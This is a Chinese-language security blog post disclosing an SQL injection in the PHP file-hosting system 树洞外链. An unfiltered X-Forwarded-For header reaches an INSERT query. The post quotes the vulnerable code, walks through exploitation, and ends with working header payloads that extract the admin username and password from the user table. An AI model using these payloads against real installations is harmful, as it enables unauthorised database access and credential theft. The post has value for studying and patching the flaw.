---
title: "树洞外链 insert 注入"
date: 2018-01-01T00:00:00+08:00
draft: false
tags: ['cms','php']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

树洞外链是一款免费开源的 PHP 外链网盘系统.

<!--more-->

/includes/save.php 23-28 行

```
$ip=get_real_ip();
$dd=date('Y-m-d H:i:s');
$rand = md5(time() . mt_rand(0,1000));
$stmt = $con->prepare("INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, '$rand', '$ip', '$dd', '0' , '$uploadUser', '$policyId');");
$stmt->bind_param('s', $ming);
$stmt->execute();
```

调用了 get_real_ip() 之后没有过滤直接 insert

/includes/function.php 36-52 行

```
function get_real_ip(){
$ip=false;
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
$ip = $_SERVER["HTTP_CLIENT_IP"];
}
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
for ($i = 0; $i < count($ips); $i++) {
if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
$ip = $ips[$i];
break;
}
}
}
return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
```

X-Forwarded-For

构造 payload

```
X-Forwarded-For: 1.1.1.1',user(),'0',uid,uid); #
```

注册用户

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/01/01/1514782481.jpg)

个人资料 - 查看 uid

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/01/01/1514782681.jpg)

访问 /includes/save.php

别忘了带上 ming 参数 (post)

添加 X-Forwarded-For 更改uid

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/01/01/1514782764.jpg)

查看我的文件

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/01/01/1514782795.jpg)

`root@localhost`

exp

```
username: X-Forwarded-For: 1.1.1.1',(select username from sd_user where id=1),'0',uid,uid); #
password: X-Forwarded-For: 1.1.1.1',(select pwd from sd_user where id=1),'0',uid,uid); #
```